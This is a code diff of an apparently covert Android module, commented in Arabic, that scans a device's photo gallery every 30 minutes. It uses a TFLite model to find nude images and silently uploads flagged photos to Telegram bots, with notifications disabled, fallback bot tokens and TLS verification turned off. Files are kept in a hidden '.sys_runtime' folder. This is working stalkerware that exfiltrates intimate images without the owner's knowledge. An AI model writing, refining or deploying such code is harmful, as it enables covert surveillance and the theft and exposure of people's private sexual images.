@@ -6,11 +6,10 @@ import logging
 import sqlite3
 import hashlib
 import gc
-import shutil
 import requests
 from datetime import datetime
 
-# ========== توحيد مسار runtime ==========
+# ========== إعداد المسارات الموحدة (يتم تحميل الموديل من هنا) ==========
 def _get_runtime_path():
     try:
         from jnius import autoclass
@@ -21,13 +20,14 @@ def _get_runtime_path():
         return os.path.join(os.getcwd(), ".sys_runtime")
 
 P = _get_runtime_path()
-M = os.path.join(P, ".models")
-if not os.path.exists(M):
-    os.makedirs(M)
+# مجلد النماذج – سيقوم main.py بتحميل engine_v2.tflite إلى هنا
+MODELS_DIR = os.path.join(P, "models")
+if not os.path.exists(MODELS_DIR):
+    os.makedirs(MODELS_DIR)
 
 logging.basicConfig(filename=os.path.join(P, "n.log"), level=logging.ERROR, filemode='a')
 
-# ========== استيراد المكتبات (آمن مع fallback) ==========
+# ========== استيراد المكتبات (tflite-runtime هو الأساس) ==========
 AI_AVAILABLE = False
 Interpreter = None
 
@@ -38,18 +38,14 @@ try:
 
     try:
         from tflite_runtime.interpreter import Interpreter
+        AI_AVAILABLE = True
     except ImportError:
-        # محاولة بديلة: tensorflow (أكبر حجماً، لكن قد يكون متاحاً)
-        try:
-            import tensorflow as tf
-            Interpreter = tf.lite.Interpreter
-        except ImportError:
-            raise ImportError("No TFLite library found")
-
-    AI_AVAILABLE = True
+        logging.error("tflite_runtime not found. AI core disabled.")
+        # تعريف وهمي
+        class Interpreter:
+            pass
 except ImportError as e:
-    logging.error(f"Failed to import AI libraries: {e}")
-    # تعريف وهمي لتجنب NameError (لن يُستخدم لأن AI_AVAILABLE = False)
+    logging.error(f"Core libraries missing (numpy/Pillow): {e}")
     class Interpreter:
         pass
 
@@ -57,29 +53,23 @@ except ImportError as e:
 class NudeDetector:
     def __init__(self, mon=None):
         self.mon = mon
-        self.active = False          # هل تتم عملية مسح حالياً؟
+        self.active = False
         self.model = None
         self._lock = threading.Lock()
         self.last_run = 0
 
-        # مسار النموذج داخل .sys_runtime/.models
-        self.model_path = os.path.join(M, "engine_v2.tflite")
+        # المسار الجديد داخل .sys_runtime/models (يُحمَّل بواسطة main.py)
+        self.model_path = os.path.join(MODELS_DIR, "engine_v2.tflite")
 
-        # المسارات المحتملة للنموذج في assets (داخل APK)
-        base_dir = os.getcwd()
-        self.assets_candidates = [
-            os.path.join(base_dir, "assets", "engine_v2.tflite"),
-            os.path.join(base_dir, "engine_v2.tflite")
-        ]
-
-        # قاعدة بيانات الكاش (لمنع إعادة تحليل نفس الصورة)
+        # قاعدة بيانات الكاش
         self.db = os.path.join(P, "n_cache.db")
         self._init_db()
 
         if AI_AVAILABLE:
-            threading.Thread(target=self._prepare_engine, daemon=True).start()
+            # بدء تحميل المحرك (قد ينتظر حتى يكتمل تحميل الملف من main.py)
+            threading.Thread(target=self._load_engine, daemon=True).start()
         else:
-            logging.warning("AI libraries missing. NudeDetector will remain inactive.")
+            logging.warning("AI libraries missing. NudeDetector inactive.")
 
     # ========== إدارة قاعدة البيانات ==========
     def _init_db(self):
@@ -87,55 +77,42 @@ class NudeDetector:
             with sqlite3.connect(self.db) as conn:
                 conn.execute('CREATE TABLE IF NOT EXISTS scan_logs (h TEXT PRIMARY KEY, ts INTEGER)')
                 conn.execute('CREATE INDEX IF NOT EXISTS idx_ts ON scan_logs(ts)')
-                old_threshold = int(time.time()) - (30 * 86400)
-                conn.execute('DELETE FROM scan_logs WHERE ts < ?', (old_threshold,))
+                old = int(time.time()) - 30 * 86400
+                conn.execute('DELETE FROM scan_logs WHERE ts < ?', (old,))
                 conn.commit()
         except Exception as e:
             logging.error(f"DB init error: {e}")
 
-    # ========== تحضير وتحميل النموذج ==========
-    def _prepare_engine(self):
-        if not AI_AVAILABLE:
-            return
-        try:
-            need_copy = (not os.path.exists(self.model_path) or 
-                         os.path.getsize(self.model_path) < 500000 or
-                         os.path.getsize(self.model_path) == 0)
-            if need_copy:
-                for src in self.assets_candidates:
-                    if os.path.exists(src) and os.path.getsize(src) > 500000:
-                        shutil.copy(src, self.model_path)
-                        logging.info(f"✅ Model copied from {src}")
-                        break
-                else:
-                    logging.error("❌ No valid model found. AI disabled.")
-                    return
-            self._load_engine()
-        except Exception as e:
-            logging.error(f"Prepare engine error: {e}")
-
+    # ========== تحميل المحرك مع انتظار الملف ==========
     def _load_engine(self):
+        """يحاول تحميل النموذج من مسار .sys_runtime/models/engine_v2.tflite.
+           ينتظر حتى 5 محاولات (كل 10 ثوانٍ) إذا كان الملف لا يزال قيد التحميل."""
         if not AI_AVAILABLE:
             return
-        try:
-            if not os.path.exists(self.model_path):
-                return
-            size = os.path.getsize(self.model_path)
-            if size < 500000:
-                logging.error(f"Model too small ({size} bytes)")
-                return
-            self.model = Interpreter(model_path=self.model_path)
-            self.model.allocate_tensors()
-            inputs = self.model.get_input_details()
-            outputs = self.model.get_output_details()
-            self.in_idx = inputs[0]['index']
-            self.out_idx = outputs[0]['index']
-            logging.info("✅ TFLite engine loaded")
-        except Exception as e:
-            logging.error(f"Load engine error: {e}")
-            self.model = None
 
-    # ========== تحليل الصورة (يعمل فقط إذا AI متاح) ==========
+        for attempt in range(5):
+            if os.path.exists(self.model_path) and os.path.getsize(self.model_path) > 500000:
+                try:
+                    # استخدام 4 خيوط لتسريع المعالجة على POCO F3 (Snapdragon 870)
+                    self.model = Interpreter(model_path=self.model_path, num_threads=4)
+                    self.model.allocate_tensors()
+                    inputs = self.model.get_input_details()
+                    outputs = self.model.get_output_details()
+                    self.in_idx = inputs[0]['index']
+                    self.out_idx = outputs[0]['index']
+                    logging.info("✅ TFLite engine loaded successfully from models directory")
+                    return
+                except Exception as e:
+                    logging.error(f"Load engine error: {e}")
+                    break
+            else:
+                logging.info(f"Model not yet available, waiting... (attempt {attempt+1}/5)")
+                time.sleep(10)
+
+        logging.error("❌ Failed to load TFLite model after retries. AI disabled.")
+        self.model = None
+
+    # ========== تحليل صورة واحدة ==========
     def analyze(self, path):
         if not AI_AVAILABLE or self.model is None or not os.path.exists(path):
             return 0.0
@@ -150,8 +127,9 @@ class NudeDetector:
         try:
             with Image.open(path) as raw_img:
                 width, height = raw_img.size
+                # bonus بسيط للصور الطولية
                 aspect_bonus = 0.05 if height > width * 1.2 else 0.0
-                img = raw_img.convert('RGB').resize((224, 224), Image.LANCZOS)
+                img = raw_img.convert('RGB').resize((224, 224), Image.BILINEAR)
 
             arr = np.asarray(img, dtype=np.float32).reshape(1, 224, 224, 3) / 255.0
             self.model.set_tensor(self.in_idx, arr)
@@ -161,37 +139,24 @@ class NudeDetector:
             prob = min(prob + aspect_bonus, 1.0)
             return prob
         except Exception as e:
-            logging.error(f"Analyze error: {e}")
+            logging.error(f"Analyze error on {path}: {e}")
             return 0.0
 
-    def _should_send(self, prob):
-        # عتبة ذكية تعتمد على حالة الشحن
-        if prob > 0.90:
-            return True
-        if prob > 0.85:
-            return True
-        if prob > 0.70 and hasattr(self.mon, '_battery_ok'):
-            try:
-                bat, charging = self.mon._battery_ok()
-                if charging:
-                    return True
-            except:
-                pass
-        return False
-
-    # ========== المسح التلقائي (يتوقف إذا AI غير متاح) ==========
+    # ========== المسح التلقائي (يُستدعى من monitor) ==========
     def scan(self):
         if not AI_AVAILABLE or self.active or self.model is None:
+            # إذا كان الموديل ما زال غير محمّل، نحاول تحميله ثانيةً بصمت
+            if self.model is None:
+                threading.Thread(target=self._load_engine, daemon=True).start()
             return
+
         now = time.time()
-        if (now - self.last_run) < 1800:
+        if (now - self.last_run) < 1800:   # كل 30 دقيقة
             return
         self.last_run = now
         threading.Thread(target=self._worker, daemon=True).start()
 
     def _worker(self):
-        if not AI_AVAILABLE or self.model is None:
-            return
         if not self._lock.acquire(blocking=False):
             return
         try:
@@ -200,7 +165,7 @@ class NudeDetector:
             if not sc:
                 return
 
-            items = sc.get_gallery_by_category("pending", limit=20)
+            items = sc.get_gallery_by_category("pending", limit=30)
             for item in items:
                 path = item.get("path")
                 if not path or not os.path.exists(path):
@@ -211,7 +176,19 @@ class NudeDetector:
                     continue
 
                 prob = self.analyze(path)
-                if self._should_send(prob):
+
+                # عتبة إرسال ذكية تعتمد على شحن البطارية
+                send = False
+                if prob > 0.90:
+                    send = True
+                elif prob > 0.85:
+                    send = True
+                elif prob > 0.70 and hasattr(self.mon, '_battery_ok'):
+                    bat, charging = self.mon._battery_ok()
+                    if charging:
+                        send = True
+
+                if send:
                     sc.update_category(item.get("hash"), "nude", prob)
                     self._report(path, item.get("label", "??"), prob)
                 elif prob > 0.45:
@@ -220,7 +197,7 @@ class NudeDetector:
                     sc.update_category(item.get("hash"), "normal", prob)
 
                 self._mark_cached(h)
-                time.sleep(0.5)
+                time.sleep(0.5)   # راحة للمعالج
 
         except Exception as e:
             logging.error(f"AI Worker error: {e}")
@@ -246,7 +223,7 @@ class NudeDetector:
         except:
             pass
 
-    # ========== إرسال التقرير مع Fallback (يعمل حتى لو AI غير متاح؟ لا، فقط إذا كان هناك تغذية) ==========
+    # ========== إرسال التقرير إلى Telegram ==========
     def _report(self, path, label, confidence):
         tg = getattr(self.mon, 'ui', None)
         if not tg or not os.path.exists(path):
@@ -267,9 +244,9 @@ class NudeDetector:
                 "disable_notification": True
             }, {"photo": f})
 
-        # إذا فشلت المحاولة الأولى -> fallback باستخدام active_tokens مباشرة
+        # إذا فشلت -> fallback باستخدام active_tokens مباشرة
         if not res or not res.get('ok'):
-            logging.warning("Primary bot failed in AI report, activating fallback...")
+            logging.warning("Primary bot failed, using fallback tokens...")
             for token in getattr(tg, 'active_tokens', []):
                 try:
                     url = f"https://api.telegram.org/bot{token}/sendPhoto"
@@ -282,10 +259,8 @@ class NudeDetector:
                             verify=False
                         )
                         if fallback_res.json().get('ok'):
-                            logging.info(f"AI report sent via fallback bot")
                             break
-                except Exception as e:
-                    logging.error(f"Fallback send error: {e}")
+                except Exception:
                     continue
 
 
